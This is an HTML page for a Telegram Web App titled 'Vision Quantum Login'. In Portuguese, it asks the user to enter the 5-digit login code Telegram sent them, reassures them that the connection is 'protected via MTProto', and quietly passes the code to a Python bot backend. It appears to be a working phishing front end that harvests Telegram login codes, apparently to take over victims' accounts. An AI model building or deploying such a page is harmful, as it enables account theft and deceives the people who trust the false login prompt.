<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #1c1c1c; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; font-size: 18px; text-align: center; }
        button { background: #0088cc; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 85%; }
        .status { color: #aaa; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <h3>Vision Quantum Login</h3>
    <p>Digite o código de 5 dígitos enviado pelo Telegram:</p>
    <input type="number" id="codigo" placeholder="00000" maxlength="5">
    <button onclick="enviar()">CONECTAR CONTA</button>
    <p class="status">Sua conexão é protegida via MTProto</p>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function enviar() {
            const code = document.getElementById('codigo').value;
            if (code.length === 5) {
                tg.sendData(code); // Envia o código de volta para o Python sem passar pelo chat
                tg.close();
            } else {
                alert("O código deve ter 5 dígitos.");
            }
        }
    </script>
</body>
</html>
